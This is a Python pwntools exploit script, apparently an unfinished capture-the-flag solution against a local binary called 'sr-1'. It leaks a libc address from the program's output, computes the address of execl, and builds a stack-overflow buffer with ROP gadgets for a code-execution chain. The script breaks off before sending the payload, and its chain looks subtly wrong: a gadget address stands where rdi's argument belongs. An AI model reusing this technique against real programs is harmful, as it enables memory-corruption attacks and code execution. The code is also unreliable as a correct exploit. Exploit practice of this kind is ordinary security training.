#!/usr/bin/env python

from pwn import *

p = process("sr-1")
print(p.recv())


"""
0x0000000000400783 : pop rdi ; ret
0x0000000000400781 : pop rsi ; pop r15 ; ret
"""

pop_rdi=p64(0x0000000000400783)
pop_rsi_r15 = p64(0x0000000000400781)

"""
$6 = {<text variable, no debug info>} 0x7f204c69a390 <__libc_system>
pwndbg> print execl
$7 = {<text variable, no debug info>} 0x7f204c721a20 <__GI_execl>
"""

system=0x7f204c69a390
execl=0x7f204c721a20
offset = system-execl

# 0x400050:       "@"
string = p64(0x400050)

p.sendline('250')

data = p.recv()
print(data)

x=data[184:192]
y=u64(x)

lib_execl=y - system + execl

buf = "A"*0x88
buf += pop_rdi
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += p64(lib_execl)
